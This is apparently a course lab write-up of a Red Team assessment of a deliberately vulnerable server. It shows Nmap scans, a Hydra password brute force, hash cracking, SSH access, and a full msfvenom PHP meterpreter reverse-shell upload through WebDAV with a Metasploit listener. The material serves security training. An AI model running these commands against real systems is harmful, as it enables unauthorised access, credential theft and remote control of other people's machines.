# Red VS Blue
## Assessment and Hardening of a Vulnerable System

We've been assigned to assess the vulnerability of a system, report on the detected activity with the current event management setup (ELK), and provide recommendations on hardening the system.

## _Network Topology_
  
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Network%20Topology.png></kbd>

## _Red Team Security Assessment_

As an initial step, the Red Team will assess the vulnerability of the system.

### Reconnaissance 

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Recon1.PNG width=700></kbd>

### Vulnerability Assessment

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Vuln.PNG width=700></kbd>

### Exploits
```
As an initial step, scans are run against the target machine to establish attack vectors.

$ Nmap -sV 192.168.1.105
```

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Nmap1.PNG width=500></kbd>

```
$ Nmap -Pn --script vuln 192.168.1.105
```

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Nmap2.PNG width=500></kbd>
```
With Apache Httpd open and Webdav showing up on our scans, it was clear the server would be accessible via a browser.
Navigating to 192.168.1.105 allows us to browse through the server folders. 
There are multiple references to a "secret_folder" directory. 
There is also a list of employee names (good source for user names) as well as roles and responsibilities. 
All very useful in planning our attack.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http1.PNG width=500></kbd>
```
Navigating to the secret_folder directory requires us to use the user name and password for Ashton.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http2.png></kbd>
```
Cracking Ashton's password is attempted using Hydra.

$ Hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/sercret_folder
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Hydra.png></kbd>

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http3.png></kbd>

```
✨✨ Ashton's credentials acquired ✨✨

We can now access the secret_folder directory.

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http4.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http5.png></kbd>
```
There are very clear instructions on how to access Webdav, which we already know is of interest from out Nmap scan.
Critically, there is also a hash along with the user account to be used.
Since they've provided which account to use (Ryan), we could attempt using Hydra once again.
However, we will first attempt to crack the hash and try using the result as Ryan's password.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Crackstation.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http6.png></kbd>

```
✨✨ Ryan's credentials acquired ✨✨

With Ryan's credentials, paths open up and there are multiple attack vectors we can pursue.

The most direct method is SSH. 
It is not a particularly vulnerable service, however, with Ryan's credentials we should be able to access the machine.

$ ssh ryan@192.168.1.105

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/ssh.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/shadow.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/flag.png></kbd>

```
✨✨ Success ✨✨

The next method is to use an exploit and setup a reverse shell.
We already have access to Webdav and we can upload and run files in there through a web browser.
Therefore we create a PHP reverse shell payload using Msfvenom:

$ Msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 –f php > shell.php

We then need to upload the file to Webdav.
A tool called Cadaver comes in very handy for this:

$ cadaver http://192.168.1.105/webdav
  Username:
  Password:
$ put shell.php
$ exit

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Cadaver.png></kbd>

```
Now that the payload has been uploaded, we need to set up a listener and then run the exploit.
To do that, we use the multi handler on Metasploit.

$ msfconsole
$ use multi/handler
$ set lhost 192.168.1.90
$ set lport 4444
$ set payload php/meterpreter/reverse_tcp
$ run

The next step is to navigate to the Webdav folder on the web browser where we uploaded the payload.
Click on shell.php

We now check Metasploit and see that a meterpreter session has been established.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http7.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/meterpreter1.PNG></kbd>

```
✨✨ Success. We can then proceed to privilege escalation if it's required. ✨✨

```









